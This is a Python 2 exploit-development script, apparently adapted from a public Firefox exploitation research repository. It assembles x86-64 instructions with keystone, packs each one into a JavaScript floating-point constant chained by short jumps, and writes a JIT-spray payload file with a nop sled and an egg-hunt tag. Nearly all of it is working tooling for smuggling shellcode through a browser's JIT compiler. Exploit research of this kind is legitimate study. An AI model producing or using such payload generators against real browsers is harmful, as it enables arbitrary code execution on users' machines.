from keystone import *
import struct
import sys
import os

# Written by @y0ny0ns0n
# simplify original byop.js(=bring your own payload) and payload2jit.py of @0vercl0k
# original code:
# https://github.com/0vercl0k/blazefox/tree/master/scripts

func_header = """
function makeJITCompiledFunc() {
"""

func_footer = """
}
"""

up_double = lambda x : struct.unpack("d", struct.pack("Q", x))[0]
up64 = lambda x : struct.unpack("<Q", x)[0] # little endian
ks = Ks(KS_ARCH_X86, KS_MODE_64)


def asm_to_double(asm_codes):
    cnt = 0
    result = ""
    for asm_code in asm_codes: 
        print "[+] converted assembly code = %s" % asm_code
        opcode_line = "".join(chr(x) for x in ks.asm(asm_code)[0])

        if len(opcode_line) > 6:
            print "[!] length is over 6! you can't JIT'ed it"
            print "[!] asm code: %s" % asm_code
            sys.exit(-1)
        elif len(opcode_line) < 6:
            opcode_line = opcode_line.ljust(6, '\x90') # add nop pading for empty

        opcode_line += "\xeb\x09" # short jmp 0x0b
        result += "\tconst asm_code%d = %.18e; // %s\n" % (cnt, up_double(up64(opcode_line)), asm_code)
        cnt += 1

    return result


def main():
    if len(sys.argv) != 3:
        print "Usage: %s [assembly file] [tag]" % sys.argv[0]
        return

    asm_file = sys.argv[1]
    if not os.path.exists(asm_file):
        print "[!] %s file doesn't exist" % asm_file
        return

    tag_for_hunt = sys.argv[2]
    if len(tag_for_hunt) != 8:
        print "[!] tag must be 8 byte! I will align or add 'A' padding"
        tag_for_hunt = tag_for_hunt[:8].ljust(8, 'A')

    with open(asm_file, "r") as f:
        asm_code = [x for x in f.read().replace("\r\n", "\n").split("\n") if x != '']

    '''
    mov qword ptr [rbp - 0x38], r11  == 4C 89 5D C8
    mov qword ptr [rbp - 0x138], r11 == 4C 89 5D C8 FF FF FF
    just for alignment, I add extra nop padding 
    '''

    print "[+] tag: %s" % tag_for_hunt
    output = ""
    output += func_header
    output += "\t// nop padding 0x800 bytes for align\n"
    for i in range(0x100):
        output += "\tconst nop%-3d = %.18e;\n" % (i, up_double(0x09eb909090909090))

    output += "\tconst my_tag = %.18e;\n" % up_double(up64(tag_for_hunt))
    output += asm_to_double(asm_code)
    output += func_footer

    answer = raw_input("print(1) or save it at payload.js(2)?")
    if answer == "1":
        print output 
    else:
        with open("payload.js", "w") as f:
            f.write(output)


if __name__ == "__main__":
    main()
